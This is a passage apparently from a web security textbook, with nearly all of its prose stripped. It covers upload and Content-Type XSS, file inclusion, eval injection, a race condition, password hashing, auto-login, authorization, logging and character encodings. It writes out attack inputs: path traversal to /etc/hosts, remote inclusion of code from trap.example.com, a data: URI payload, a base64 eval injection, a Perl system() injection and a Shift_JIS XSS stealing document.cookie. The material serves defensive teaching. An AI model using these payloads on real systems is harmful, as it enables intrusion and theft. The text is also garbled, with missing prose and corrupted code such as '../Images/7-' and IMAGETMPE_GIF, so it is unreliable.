 4-115IE  Content-Type  Content-Type  IE  IE  URL   IE  Content-Type [1]" HTML  PDF   XSS" URL  PATHINFO  /a.html  IE  URL  65JPEG  JFIF JPEG  JFIF  JPEG  66IE7  HTML  IE8 text/plain 67XSS[2]
  XSS 



 4.12.2 PHP  getimagesize  
getimagesize 
261

array getimagesize(string $filename [, array &$imageinfo])

  PHP  68
 4-21getimagesize 

 1 2 3

 IMAGETYPE_GIF IMAGETYPE_JPEG IMAGETYPE_PNG

 4c-002a.php  XSS   getimagesize  XSS  4c002b.php check_image_type 
/4c/4c-002bcheck_image_type 

// function check_image_type($imgfile, $tofile) // $imgfile :  // $tofile :  function check_image_type($imgfile, $tofile) {
//  $info = pathinfo($tofile); $ext = strtolower($info['extension']); //  if ($ext != ../Images/7-' && $ext != 'jpg' && $ext != 'gif') {
die('  gifjpg ../Images/7-  '); } //  $imginfo = getimagesize($imgfile); //  $type = $imginfo[2]; //  //  return if ($ext == 'gif' && $type == IMAGETMPE_GIF)
return true; if ($ext == 'jpg' && $type == IMAGETMPE_JPEG)
return true; if ($ext == ../Images/7-' && $type == IMAGETMPE_PNG)
return true; //  return  die('  '); }

262

 check_image_type 
/4c/4c-002b.php
$tmpfile = $_FILES["imgfile"]["tmp_name"]; $orgfile = $_FILES["imgfile"]["name"]; if (! is_uploaded_file($tmpfile)) {
die('  '); } //  check_image_type($tmpfile, $orgfile); $tofile = get_upload_file_name($orgfile);
BMP  MS07-057
 3  GIFJPEG  PNG  Windows  BMP   BMP 
 BMP BMP   BM BMP  Content-Type IE 6  IE 7   HTML  JavaScript 
PNG  BMP  MS07-057  2007  10  
 BMP   BMP  Windows  BMP  BMP  PNG 
 Web  BMP 


 Content-Type

 Content-Disposition 
 Content-Type
 PDF  XSS  ContentType  PDF  Content-Type 
263

application/pdf IE  Content-Type  
 Web Apache Content-Type  mime.types PDF   mime.types  ContentType

 Web 
  check_image_type 
/4c/4c-003b.php

<?php

define('UPLOADPATH', '/var/upload');

// function check_image_type($imgfile, $tofile)

// $imgfile :  // $tofile :  function check_image_type($imgfile, $tofile) { /*  */ }



$mimes = array('jpg' => 'image/jpeg', ../Images/7-' => 'image../Images/7-'



$file = $_GET['file'];

$info = pathinfo($file);

// 

$ext = strtolower($info['extension']);

// 

$content_type = $mimes[$ext]; //  Content-Type

if (! $content_type) {

die('  gifjpg ../Images/7-  ');

}

$path = UPLOADPATH . '/' . basename($file);

check_image_type($path, $path);

header('Content-Type: ' . $content_type);

readfile($path);

?>

 Content-Disposition 
  Content-Disposition: attachment ContentType  application/octetstream""
264


Content-Type: application/octet-stream Content-Disposition: attachment; filename="hogehoge.pdf"
Content-Diaposition  filename     XSS    Web     7.4  
    68http://www.php.net/manual/zh/function.getimagesize.php  2009    4-22





 

Yahoo 

yahoo.co.jp
265

yimg.jp

JAPAN

YouTube

youtube.com

ytimg.com

niconico  nicovideo.jp

nimg.jp

Twitter

twitter.com

twimg.com

Amazon.co.jp

amazon.co.jpimages

amazon.com

 
 PDF  XSS 
 XSS  IE   
 PC   PC  Content-Type  Content-Type  "" XSS


 Content-Disposition 
 
 URL 


266

    Web   Content-Type  
 [1]  .2009  3  30 . [  ]IE  Content-Type  [  ]IE  Content-Type . 2010  10  13  .  @IT http://www.atmarkit.co.jp/ait/articles/0903/30/news118.html [2] 2007  12  10 .  ·   (XSS) XSS.  2010  10  13  : http://www.tokumaru.org/d/20071210.html
267

4.13include 
 include  4.13.1  PHP PHP  require  require_once  include  include_once   include  include   69PHP  URL RFI 69 CWE-98  http://cwe.mitre.org/data/definitions/98.html 2010  12  19  CWECommon Weakness Enumeration http://www.ipa.go.jp/security/vuln/CWE.html 
Web  
     include  include  
268

 
/4d/4d-001.php
<body> <?php
$header = $_GET['header']; require_once($header . '.php'); ?>  </body>
 require_once   spring.php 
[  ] spring.php
 <br>
 URL 
http://example.jp/4d/4d-001.php?header=spring
269

 4-116    URLURL  %00  PHP  .php  4.2 
http://example.jp/4d/4d-001.php?header=../../../../etc/hosts%00
 4-117 Web  /etc/hosts  Web    include    1RFI PHP  include/require  URL  include  Remote File Inclusion; RFI PHP5.2.0 
270

  
     http://trap.e xample .com/4d/4d-900.txt
<?php phpinfo(); ?>
 URL  4d-001.php 4d-001.php  URL   .php  URL  ?  .php 
http://example.jp/4d/4d-001.php?header=http://trap.example.com/4d/4d-900.txt?  4d-001.php  require_once  .php  URL  
http://trap.example.com/4d/4d-900.txt?.php
 .php  4d-900.txt  phpinfo 
 4-118  4-118  phpinfo  Host  phpinfo  example.jp 
271

RFI   RFI   
 RFI  data:  PHP   URL  data: 70
http://example.jp/4d/4d-001.php?header=data:text/plain;charset=,<?php+phpinfo()?>
 RFI  allow_url_include  Off   data:  PHP  PHP  
PHP  http://www.php.net/manual/zh/wrappers.php.php data:  http://www.php.net/manual/zh/wrappers.data.php  2  RFI  Web  


  PHP 
  
     /4d/4d-002.html
<body> <form action="4d-003.php" method="POST">  <br> <textarea name=answer rows=4 cols=40> &lt;?php phpinfo(); ?&gt;
272

</textarea><br> <input type="submit"> </form> </body>
 POST  
/4d/4d-003.php
<?php session_start(); $_SESSION['answer'] = $_POST['answer']; $session_filename = session_save_path() . '/sess_' . session_id();
?> <body>  <br>  <br><?php echo $session_filename; ?><br> <a href="4d-001.php?header=<?php echo $session_filename; ?>%00">  </a> </body>>
 4-119 
 4-119  
 ID   OSLinux   ID  Cookie  

answer|s:21:"<?php phpinfo(); ?> ";
 PHP  4-119 "
273

" URL   .php 
 4-120 phpinfo   Web  Web   70 http://d.hatena.ne.jp/t_komura/20070128/1170004898   include   include        4.10   RFI 
274

PHP5.2.0   phpinfo  allow_url_include  Offphp.ini 
allow_url_include = Off
 PHP  include   
275

4.14eval 
PHP  PerlRubyJavaScript   eval evaluate   eval  eval  4.14.1eval    eval  eval  71  eval  71"eval " CWE-95 "Eval Injection" eval http://cwe.mitre.org/data/definitions/95.html2010  12  18  eval  OS 
    eval   eval  eval   eval  eval  eval 
276

  eval 

eval  
PHP  var_export  PHP  

<?php $e = var_export(array(1, 2, 3), true); echo $e;

//  PHP 



array ( 0 => 1, 1 => 2, 2 => 3,
)

 PHP  eval  
 var_export 

277

     /4e /4e -001.php
<?php $a = array(1, 2, 3); //  $ex = var_export($a, true); //  $b64 = base64_encode($ex); // Base64 
?> <body> <form action="4e-002.php" method="GET"> <input type="hidden" name="data"
value="<?php echo htmlspecialchars($b64); ?>"> <input type="submit" value="  "> </form> </body>
 var_export  Base64   4e-002.php 
     /4e /4e -002.php
<?php $data = $_GET['data']; $str = base64_decode($data); eval('$a = ' . $str . ';');
?> <body> <?php var_dump($a); ?> </body>
4e-002.php  Base64  eval  var_dum p  72 eval   var_export  $a 
$a = array ( 0 => 1, 1 => 2, 2 => 3,
);
4e-002.php 
278

 4-121  4e-002.php  eval   eval  
$a =  ;  ; 
$a = 0; phpinfo();  Base64  Fiddler  Tool  "Text Encode/Decode" 4-122   0; phpinfo() "To Base64"Base64 
 4-122 Fiddler  Base64   4e-002.phpURL 
http://example.jp/4e/4e-002.php?data=MDsgcGhwaW5mbygp
279

 4-123  phpinfo  PHP    72 var_dump  HTML  XSS 
 evel  PHP 4e-002.php   eval  
 eval   eval   eval PHP   4-23PHP 





create_function()



280

preg_replace()

 e 

mb_ereg_replace()

 4  'e' 

 
PHP 

`call_user_func()` `call_user_func_array()` `array_map()`

`array_filter()`

`usort()`

`uksort()`

  eval 
 eval  eval   eval   eval   eval  eval  eval   eval 
implode/explode
serialize/unserialize
implode  explode  serialize unserialize   73  eval   eval  preg_replace_callback  e  preg_replace   eval 

281

 eval  4e-002.php  hidden  
 HTTP  
 eval 
 eval   ;  , 
Perl  eval 
Perl  eval  eval  eval  Block eval 
 eval  eval  eval 
eval("\$c = $a / $b;"); # 
 $b  /sbin  
$b = '1;system("ls /sbin")';
 eval  eval 
eval 
eval { $c = $a / $b; # 
}; if ($@) { # 
#  }
eval  eval  
73CakePHP  http://cakephp.jp/modules/newbb/viewtopic.php? viewmode=flat&topic_id=2496&forum=3

282

 eval eval  eval  eval    preg_replace [2] e  preg_replace   GIJOE PHP [1]  preg_replace   WordPress  call_user_func_array 
  [1] GIJOE .2005.PHP PHP .  . [2]  .2008  6  6 . preg_replace  preg_replace . 2010  12  19  , T.Terada   : http://d.hatena.ne.jp/teracc/20080606 [3]  .2004  10  11 . PHP  Web   PHP  Web . 2010  12  19  : http://www.asahi-net.or.jp/~wv7ykmr/memo/php_security.html
283

4.15
 Web   ----Race Condition 4.15.1    
      
 
284

 Java Servlet   Servlet  Tomcat  Servlet   Tomcat6.0 
Servlet 
     C4f-001.jav a
import java.io.*; import javax.servlet.http.*;
public class C4f_001 extends HttpServlet { String name; // 
protected void doGet(HttpServletRequest req, HttpServletResponse res)
throws IOException { PrintWriter out = res.getWriter(); out.print("<body>name="); try {
name = req.getParameter("name"); //  name Thread.sleep(3000); //  3  out.print(escapeHTML(name)); //  } catch (InterruptedException e) { out.println(e); } out.println("</body>"); out.close(); } }
 Servlet  name  name  3   name  3 escapeHTML   XSS
 Servlet name=yamada 1  name=tanaka 

 4-124
285

 tanaka    Servlet  Servlet    yamada  tanaka 
 4-125 yamada  name  "yamada" 1 tanaka   name  "tanaka"  "tanaka"   "tanaka"   
name   name   Servlet   
  
286

  name  
try { String name = req.getParameter("name"); //  Thread.sleep(3000); //  3  out.print(escapeHTML(name)); // 
} catch (InterruptedException e) { out.println(e);
}
 Java  synchronized  synchronized   synchronized 
try { synchronized(this) { //  name = req.getParameter("name"); Thread.sleep(3000); //  3  out.print(escapeHTML(name)); //  }
} catch (InterruptedException e) { out.println(e);
}
 2  synchronized(this)  Servlet  synchronized  Servlet  synchronized   name  
287

 4-126
 "yamada" "tanaka"   Servlet   ×3  Servlet DoS 
  
  
 
Java Servlet  Servlet  JSP 
<%! String name; %>
  JSP   SingleThreadModel  Servlet   Servler  Servlet2.4  SingleThreadModel Deprecated74 
288

74SingleThreadModel  http://docs.oracle.com/javaee/1.4/api/javax/servlet/SingleThreadModel.html
289

 5 
     
Authentication Authorization  Log
5.1
Web  3   HTTP  HTML Form   SSL  HTML Form  
Login    Form  
5.1.1  ID   SQL  ID  
290

SELECT * FROM usermaster WHERE id=? AND password=?
  
 SQL   SQL   SQL  4.4.1    SQL   SQL  ID   ID   SQL   5.1.3    ID   Brute Force Attack ""  5-1
 5-1 ID   ID   5.1.2 
291


Social Hacking  "" 
  Shoulder Hack
Shoulder Hack    Shoulder Hack Shoulder Hack   5.1.5 
 Web  Shoulder Hack   

Phishing Social Engineering  Yahoo!JAPAN  
 Web  7.2 
  Web  
 
 

 
 SQL  Bug
292

 
 SQL  Bug  1  ASQL 4.4.1  B ID4.6.4  CCookie 4.8.2  D4.7.1  EHTTP 4.7.2  A SQL  SQL   BC Cookie  ID   DE    """ "   4.6      5-2  
293

 5-2

 
 =  ^ 
"^" 10 26  5-1  
 5-1

 10 

4  1 

26 

 46 

62  

 1500 

6  100 
 3 

8 
1 
 2000 

 570  220





294

94  

 7800 

 6900 

 6100 

 

 5-1   5-2   2 
RockYou  3200 "123456" http://jp.techcrunch.com/archives/20100121depressing-analysis-of-rockyou-hackedpasswords/  Htomail "123456" http://journal.mycom.co.jp/news/2009/10/08/022/index.html  MySpace "password1" https://itpro.nikkebp.co.jp/article/USNEWS/20061218/257183  " 10  ""Password1! "  


" " 

 8 

295

 
 ASCII 0x200x7E 128   PassphrasePhrase  ""     Web     8   ID   Twitter  5-3  Twitter  3 "password"
 5-3Twitter 
296

"""" ""  1 2 2010  10  20  3https://twitter.com/settings/password
5.1.2   3   
  Web 
 ID   

  ATM  3   10  4 4 PCI DSS 2.0https://zh.pcisecuritystandards.org/minisite/en/pci-dss-supporting-docs-v20.php7.5.13 " 6 " PCI DSS  
  30  5 
5 PCI DSS 2.0  30 7.5.14  30  30  30 
297

 10  30  100   10   IP  
    
 5-4 Joe   ID  Joe Joe account  /  Joe Joe  5-5  Joe 
298

 5-5Joe    ID Reverse Brute Force Attack ID  5-6 "password1" 
 5-6   Joe    MySpace  password1  0.22% password1   1000  2  6  
   ID  Joe     ID   ID IDSNS  mixi  GREE facebookMySpaceEC  Amazon  ID7
299

Twitter  ID  Twitter 
 ID   ID 

 ÷    IP  


 5-2

  
 
ID
  



 
 
  


  /  
 
  /  

  
6 
7
5.1.3
300

 
  



 SQL  
Message Digest Cryptographic Hash

  Web  

 key  key Compromise 8 8  
 key  key key   Web  key key   key  
 

301

" "TDETransparent Data Encryption   TDE  SQL   SELECT TDE   TDE  SQL  TDE SQL   TDE  
 
 bit   Cryptographic Hash Function  SSH   MD5   md5sum 
"echo -n" echo md5sum   "password1""password2" 
 Pre-image Resistance 
302

  2 Second Pre-image Resistance  2   2 Weak Collision Resistance Collision Resistance   Strong Collision Resistance  MD5   MD5      SHA-256    5-7  
 5-7  
  
303

 3    1     DVD-ROM  ISO      Offline   md5brute9  MD5   8 "zzzzzzzz"  
 Pentium Dual-Core 2GHz Core  40   138 
304

 8  5 5  676  10  3   8  CPU   MD5 SHA-1  SHA-256  1    2Rainbow Crack     2003 Rainbow Table ""     7   rcrack.exe  RainbowCrack Project11  Rainbow Crack 
305

Rainbow Crack  45   md5brute  997  md5brute  1300  md5brute   
RainbowCrack Project  MD5   8  ASCII  10  12  13
  10  20   20   salt 
 3
  
306

Dummy "" 5-8 
 5-8 Web   5-8   SQL    5-8  saburo  evil2  evil2  123456 saburo  123456      MD5  20    8   
salt stretching  1salt salt  salt  salt  
307

 salt 

 salt
""salt   20 
 salt   salt 
 salt
 ID  salt
 salt  salt  salt   salt 
 ID  salt    ID  salt salt 
 2stretching
 salt salt 
stretching MD5  SHA-1SHA-256   


/51/51-001.php
<?php // FIXEDSALT  define('FIXEDSALT', 'bc578d1503b4602a590d8f8ce4a8e634a55bec0d'); define('STRETCHCOUNT', 1000);
 //  salt function get_salt($id) { return $id . pack('H*', FIXEDSALT); //  ID  }
308

function get_password_hash($id, $pwd) { $salt = get_salt($id); $hash = ''; //  for ($i = 0; $i < STRETCHCOUNT; $i++) { $hash = hash('sha256', $hash . $pwd . $salt); // stretching }
return $hash; } //   var_dump(get_password_hash('user1', 'pass1')); var_dump(get_password_hash('user1', 'pass2')); var_dump(get_password_hash('user2', 'pass1'));

string(64) "a44812a099b40ee49ffe2bd6c5de7403a1854e009ba9e2b417b9770d4ffac54b" string(64) "cc2c26c9a22d7318f48ed99e8915c6861559ade98e4df3dab64e51c7ea476389" string(64) "3fca4aab6f7bf9ed2ac855dbc0e22c148e7e23a137c497777e1e9269902571c8"
get_salt  ID salt  ID  pack  
get_password_hash  salt  SHA-256  1000   14 SHA-256 
 get_password_hash  $id  $pwd   salt 
stretching  1000    DoS  stretching  
9http://www.vector.co.jp/soft/unix/util/se365582.html
10 2010 " 2010" CPU 
11http://project-rainbowcrack.com/
12http://project-rainbowcrack.com/buy.php
13 RainbowCrack Project  202 
14 stretching  Cryptography Engineering[1]
309

  SQL  
       TDE     USB   5.1.4  Web """" 59 
 5-9   XSS  
310

  Web  Google  
 
  Cookie   Expires  30 
Set-Cookie: user=yamada; expires=Wed, 27-Oct-2010 06:20:55 GMT Set-Cookie: autologin=true; expires=Wed, 27-Oct-2010 06:20:55 GMT
 Cookie  Cookie user=yamada  user=tanaka   Web   
Set-Cookie: user=yamada; expires=Wed, 27-Oct-2010 06:20:55 GMT Set-Cookie: passwd=5x23AwpL; expires=Wed, 27-Oct-2010 06:20:55 GMT Set-Cookie: autologin=true; expires=Wed, 27-Oct-2010 06:20:55 GMT
    Cookie  XSS   
 
 Token Ticket
311

   Cookie  Expires   PHP   session_set_cookie_params  Cookie  Expires   php.ini  session.gc_maxlifetime  24    XSS    php.ini  15

session.gc_probability = 1

session.gc_divisor = 1000

604800  7*24*60*60

session.gc_maxlifetime = 604800

  autologin  on 
/51/51-002.php

<?php

// 

$autologin = @$_GET['autologin'] == 'on';

$timeout = 30 * 60;

if ($autologin) { // 

$timeout = 7 * 24 * 60 * 60; // 

session_set_cookie_params($timeout); // Cookie  Expires 

}

session_start();

session_regenerate_id(true); //  ID 

$_SESSION['id'] = $id;

//  ID

$_SESSION['timeout'] = $timeout; // 

$_SESSION['expires'] = time() + $timeout; // 

?>

<body>

login successful<a href="51-003.php">next</a>

</body>

312


 1  30 
 ID  Cookie  Expires  1 

 $_SESSION['timeout'] 
 $_SESSION['expires'] 
 
/51/51-003.php
<?php session_start(); function islogin() { if (! isset($_SESSION['id'])) { //  id  return false; //  } if ($_SESSION['expires'] < time()) { //  $_SESSION = array(); //  $_SESSION  session_destroy(); //  return false; } //  $_SESSION['expires'] = time() + $_SESSION['timeout']; return true; //  true } if (islogin()) { // 
islogin  

 ID  Cookie  Expires   
 4.6.4  

313

 Cookie Cookie  Expires   1  HttpOnly  HTTPS  secure 
 



 ID



 5-10   


function set_auth_token($id, $expires) { do { $token =  ;  ('insert into autologin values(?, ?, ?)');  ($token, $id, $expires); if (  ) return $token; } while(  ); die('  ');
}  $timeout = 7 * 24 * 60 * 60; // 1  $expires = time() + $timeout; //  $token = set_auth_token($id, $expires); //  setcookie('token', $token, $expires); //  Cookie
set_auth_token  ID   
  set_auth_token  Cookie

 

314


function check_auth_token($token) {  ('select * from autologin where token = ?');  ($token);  $id  ; if (  ) return false; if (  <  ) {  ; return false; } return $id;
}  function islogin($token)
if (  ) return  ; // 
//  $id = check_auth_token($token); if ($id !== false) {
 ;  ; ; return  ; } return  ; //  } // 
islogin   check_auth_token  check_auth_token    ID
    

 ID  
315

 ID 

$_SESSION = array(); //  $_SESSION  session_destroy(); //  //  ID   ('delete from autologin where id=?');  ($id);

 Windows  Kerberos  ASP.NET From 
 
SSO  OpenID 

 




15 session.gc_probability / session.gc_divisor   session.gc_maxlifetime  
  XSS  CSRF  
  
316


5.1.5  ID  
Mask
 HTTPS  HTTPS
 password  "*" shoulder hack 
 HTTPS  HTTPS   HTTPS  

 DNS DNS cache poisoning  DNS spoofing 
 HTTPS  
 HTTPS  HTTPS

   
 Web  Jakob Nielsen  2009  6 " "16  SANS 17 
 Web   Windows Vista  VPN  ""
317

 5-11 /   ""  "" 16http://www.nngroup.com/articles/stop-password-masking/ 17https://blogs.sans.org/appsecstreetfighter/2009/06/28/response-to-nielsens-stop-passwordmasking/ 5.1.6    "" ""  ID   5-12  ID/  ID/  
318

 5-12 ID 
 ID  ID  ID 2   ID  ID   1  ×1  1  
 ID  
"ID "
 ID  5.1.2   
 
5.1.7  CSRF   CSRF 

 POST 

 CSRF 
319


     /51/51-011.php
//  session_start(); <form action="51-012.php" method="POST"> <--  CSRF  --> <input type="hidden" name="token" value="<?php echo
htmlspecialchars(session_id()); ?>"> <input type="submit" value="  "> </form>
 POST 51-012.php CSRF   hidden  tokentoken  ID 

/51/51-012.php
<?php $token = $_POST['token']; session_start(); //  if ($token != session_id()) { die('  '); } //  $_SESSION  $_SESSION = array(); //  session session_destroy();
?>
 CSRF  CSRF  4.5.1 
 $_SESSION   $_SESSION  
5.1.8  /  

 5.1.1 
320

 5.1.1  
 5.1.2  
 5.1.3  
 5.1.5   5.1.6  
  Key Value 5-3   5-3





098f6bcd46

test

5f4dcc3b5a

password

900150983c

abc

d16fb36f09

xyz

  1  1  2  2  3  3 ... 

321

Reduction Function   5-13  3   3 
 5-13   5-14  
 5-14  a48927    lookie abcxyzroot00  5-15 
322

 5-15  root00   system  system  system  a48927 system   MD5  SHA-1   SHA-256 
 1Niels Ferguson, Bruce Schneier, Tadayoshi Kohno. (2010). Cryptography Engineering. Wiley Publishing, Inc.
323

5.2
 ID ID 
     
5.2.1  ID 
  ID     5.1   SQL 4.4.1  4.9.2   
   
324

 
 URL  URL   A   B   A  B  A  URL URL  B   A  5-16  A   URL 
 5-16 A  A  B  URL    hidden 
325

 5-17 B  A  B   5-4
 A

 B

 

  

  URL 



 

  URL    URL   

       



 A URL   B
 ID 
326

 ID  ID  ID 
 1ID 
 A  ID  
 ID  A   ID 
 2 ID 
  ID  ID  UNIQUE 
 Bug  /   ID 
 1  ID   ID   ID  
  Web   
  CAPTCHA
 CAPTCHA 
CAPTCHA 18
 PHP  CAPTCHA   5-18  PHP  cool-php-captcha19  GPLv3  
327

 5-18cool-php-captcha   CAPTCHA   Google  CAPTCHA  
 5-19 CAPTCHA  CAPTCHA    CAPTCHA   CAPTCHA 
328

18CAPTCHA  2008  4  21   http://tsdr.uspto.gov/#caseNumber=78500434&caseType=SERIAL_NO&searchType=statusSearch 19https://code.google.com/p/cool-php-captcha/ 5.2.2 
   SQL  CSRF      CSRF   5-20 
329

 5-20   
 
SQL  CSRF   SQL  4.4.1  SQL       CSRF  4.5 
330

  CSRF  5.2.3    4 
 CSRF  SQL     5.2.1       
    SQL  CSRF  5.2.4 
331


  ""
   
   

1.  2.  3. 
    20 20
 


" " 


332

 
  21    21""""
 
  " "      4   A B URL C D CD A A B URL  C
333

 C 5-21 
 5-21C           5.2.2   5-22 D
 5-22D D ""  
334

    
5.2.5  
 PC     5.2.4  
5.2.6  CSRF    SQL 
5.2.7  
    SQL  CSRF  
335

5.3
Authorization 5.3.1 
    WebMail     WebMail   5.3.2   ID   URL  ID ID  URL  ID   5-23  5-23  ID  yamada   URL  ID"id=yamada"
 5-23
336

 URL  id=yamada  ID id  id=sato   sato  5-24 
 5-24 ID   ID  URL  ID  hidden   POST  Cookie  hidden  Cookie   ID  ID ID ID ID   ID    5-25    5-25 
337

 5-25  5-26   URL  a001.php   b001.php 
338

 5-26 URL   URL URL  
 URL  5-26   admin  rootmanage   URL  URL   URL  
 hidden  Cookie   hidden  Cookie   userkind=admin  Cookie   Cookie  Cookie  

339

 3  URLhidden Cookie   
 URL   URL   URL   URL  3 
 URL   URL   URL Access Ticket  URL   POST  3.1    Referer  URL  URL  URL   URL  URL   URL  URL 
5.3.3   ""  ASPApplication Service Provider 5-27   ASP  A B C  
340

 5-27ASP   5-5

 



 





×

×

 



×

×

 





×













 

×

  341

 5-5 """"""Role  5-5     admin  root  
   ID  ID  5.3.4        ID   Cookie  hidden  5.3.5   URL   hidden Cookie  
342

5.4
 
5.4.1  3 
    5.1     Web   
5.4.2 Web 
Web ApacheIIS       Access DeBug  3 
  Web  ""
343

  
 SQL   SQL   
  Web  
Web  2004   Web  
 5.4.1  3 
 Payment Card IndustryPCIPCI-DSS 
    
5.4.3 






344

  
     
  4W1HWhenWhoWhereWhatHow 
  IP   ID URL ID    ID   
     Web  

345

  
   
  DVD  
  Web  
 NTPNetwork Time Protocol 
5.4.4   Java  log4jlog4j  apache  Java PHP  log4php .NET  log4net  22 22http://logging.apache.org/  log4j  log4php 


 Layout

log4j  


346

 syslog Windows NTEVENT log4j  fatal error warn info debug trace  debug info   info  5.4.5     4W1HWhenWhoWhereWhatHow  NTP 
347

 6 
Web  Bug   
6.1
Web   Bug  Web  6-1 
 6-1Web     ""Character Code
Character Set Character Encoding Scheme
348

 349

6.2
 

ABC......Z01 2......9   
 6-1 
 6-1

  



 



ASCII

7 





ISO8859-1

8  ASCII   

JIS X 0201



8 

 

ASCII



JIS X 0208

16 





 

16 



JIS X 0201JIS X 0208 NECIBM 

JIS X 0213

16 





Unicode

21 

 



350

GB2312

16     

GBK

16 



GBKGB2312 

GB18030

32 



 GB2312Unicode

ASCII  ISO-8859-1
ASCIIAmerican Standard Code for Information Interchange  USASCII 1963  7  ASCII ASCII  
ISO-8859-1  ASCII  8  ISO-8859-1  Latin-1 ASCII  
JIS1 
JIS X 0201  ASCII  8  JIS X 0201  ASCII JIS X0201   JIS X0201  ASCII  0x5C "\"""2 ASCII  0x7E  Overline 
ASCIIISO-8859-1JIS X 0201  6-2 

351

 6-21 
 JIS X 0201  1978  JIS X 0208  JIS X 0208  1  2965  2  3390 JIS X 0208  
JIS X 0208  ASCII  JIS X 0201   JIS X 0208 """"ASCII  JIS X 0201 """""" 
 2000  JIS X 0208  JIS X 0213 JIS X 0213  3   1259  4  2436 "" 3 
 JIS X 0213  Windows Vista   JIS X 0213  JIS X 0213 

 1993  Windows 3.1    Windows 3.1 
 JIS X 0201  JIS X 0208  NEC  IBM  NEC "" IBM   3 """"4 
352

 JIS X 0213  Unicode   CP932 CodePage  CP932  Unicode     Unicode Unicode  1.0  1993   Unicode  6.2 2012  9  27   Unicode  16   Unicode  21  16 Basic Multilingual PlaneBMP Unicode Code Point U+XXXXXXXX  4  6  "" U+8868 Unicode6.0  ASCIIISO-8859-1JIS X 0201JIS X 0208JIS X 0213 6-3 
 6-3 GB2312 GB2312  GB2312-80 "·" 1981  5  1 GB2312 
353


GB2312  16  ASCII  ASCIIGB2312   6763  3755  3008   682   GBK  GB18030 
GBK
GBK  GB2312  GB2312 GB2312-80  
 GBK  Windows 95  CP936   CP936  GBK
GB18030
GB18030 " ? " 2000   GB2312 
GB18030  160   GB18030-2005  Unicode  70244   

 JIS X 0201  "\"""
 ISO-8859-1  Unicode 0xA5 ""  0x5C "" 6-2  56
 6-2

 ASCII JIS X 0201 ISO-8859-1 Unicode

0x5C \  \ \
354

0xA5 %5 ·6  

GB2312 GBK GB18030

\



\



\




  Unicode ""U+00A5 JIS   0x5CJIS X0201  0x5C  
 SQL ""U+00A5 "\"7
1Japanese Industrial StandardsJISJISC ----
2----
3----
4----
5 US-ASCII  7  1  0x25 
6
7IPA SQL "A.3  Unicode  SQL "

355

6.3
 Encoding 
   US-ASCIIISO-8859-1JIS X 0201   JIS X 208  Unicode  US-ASCII  "" ""  Web  JIS  Shift_JIS  EUCJP Unicode  UTF-16  UTF-8  Shift_JIS 1980   JIS X0208  JIS X0201  Shfit_JISShift_JIS  Shift_JIS Code Page 932  CP932  Shfit_JIS 2 0x810x9F  0xE0 0xFC  0x400x7E  0x800xFC   6-4 
 6-4Shfit_JIS   EUC-JP  UTF-8 Shfit_JIS   
  Shift_JIS 
356

   Shift_JIS  Shift_JIS   0x5C"""5C" """"  6-5  Bug PHP  Bug "" 8
 6-5""""  Shift_JIS   1strpos  0 
<?php $p = strpos('  ', '  '); var_dump($p);
 mb_strpost   strpos  9  Shift_JIS """" 6-6  
357

 6-6  
 UTF-8  
 Shift_JIS 
 Shift_JIS  Shift_JIS 
 Shift_JIS  0x81
 Shift_JIS  0x81 0x21
 Shift_JIS  XSS
 Shift_JIS  XSS   Shift_JIS 
63/63-001.php
<?php session_start(); header('Content-Type: text/html; charset=Shift_JIS');
?> <body> <form action="">  <input name=name value="<?php echo htmlspecialchars($_GET['name'], ENT_QUOTES   <input name=mail value="<?php echo htmlspecialchars($_GET['mail'], <input type="submit"> </form>
358

</body>
Query String 6-7 
 6-763-001.php   URL 
http://example.jp/63/63-001.php?name=1%82&mail=onmouseover%3dalert(document.cookie)//
 6-8 
 6-863-001.php   JavaScript  6-9  
359

 6-9 JavaScript  
<input name=name value="1 · ><BR>  : <input name=mail value="onmouseover=alert(document.cookie)//"><BR>  input  
 6-10  0x82  Shift_JIS  Internet Explorer  Firefox  0x82  "   "  Shift_JIS  input  "value= " HTML  value  
 6-110x82  "  "value=" mail= " onmouseover=alert(document.cookie)// """  HTML  
360

htmlspecialchars  XSS  63/63-002.php
 <input name="name" value="<?php echo htmlspecialchars($_GET['name'], ENT_QUOTES   <input name="mail" value="<?php echo htmlspecialchars($_GET['mail'], ENT_QUOTES  6-12  onmouseover  JavaScript  
 6-12 XSS  EUC-JP EUC-JP  Unix  US-ASCII  EUC-JP  JIS X 0208  0xA1 0xFE   6-13 EUC-JP 
 6-13EUC-JP   2  1  Shift_JIS "5C"EUC-JP  2   6-14  """"
361

 6-14""""  EUC-JP   3strpos  0 
<?php $p = strpos('  ', '  '); var_dump($p);
 Shift_JIS  mb_strpos   EUC-JP
 EUC-JP   EUC-JP " Shift_JIS  " Shift_JIS  EUC-JP   ISO-2022-JP 8 GB2312 ---- 9mb.internal_encoding ISO-2022-JP  7  10  US-ASCII  JIS X 0208  ISO-2022-JP "JIS " 6-15   ISO-2022-JP "ABC "  10Escape Sequence "0x1B" ESC ----
362

 6-15ISO-2022-JP  "ESC $ B" JIS X 0208 "ESC ( B" USASCII  ISO-2022-JP    "" ISO-2022-JP   ISO-2022-JP JIS X 0201  Shift_JISEUC-JPISO-2022-JP  JIS   Unicode UTF-16  UTF-8
UTF-16 Unicode  16   16 Code Point USC-2 Unicode   Unicode  21  UTF-16   UCS-2  BMP  UTF-16 Surrogate Pair BMP  16  Unicode  10242  10 0xD8000xDBFF  0xDC000xDFFF 2  20  100   BMP "" "" Unicode  U+20BB7 D842-DFB7 " " UTF-16 
 6-16" " UTF-16  UTF-8 UTF-8  US-ASCII  Unicode UTF-8  6-3  Unicode  1  4 
363

  6-3UTF-8 
 6-17 UTF-8 
 6-17UTF-8   6-17  UTF-8    UTF-8  Shfit_JIS "5C" Shift_JIS  EUC-JP   UTF-8 JIS X0208  3 JIS X 0213  3  4  4  "" U+20BB7 UTF-8 "F0 A0 AE B7"4  6-18  "" 
 6-18" " UTF-8  UTF-8  
UTF-8 non-shortest form  6-3 UTF-8  U+007F  1   1   6-4 "/"U+002F 1 4 
364

 6-4"/"
UTF-8   UTF-8  
 0xC0 0xAF  0x2F  0xC0 0xAF   UTF-8  0xC0 0xAF  Shift_JISUTF-16     6-19
365

 6-19   UTF-8 RFC3629  
 UTF-8  
Java SE6 Update 10  JREJava  PHP5.3.1  htmlspecialchars   UTF-8  ISO/IEC 10646  Unicode  2006  Unicode  31  UTF-8 1   6  ISO/IEC 10646  2006   Unicode UTF-8  4 
366

 PHP  mb_check_encoding   UTF-8  5  11
0xD8000xDBFF  0xDC000xDFFF  UTF-8  3  U+D800  UTF-8  "ED A0 80" UTF-8  UTF-8   UTF-8  UTF-32  32   UTF-8  4 
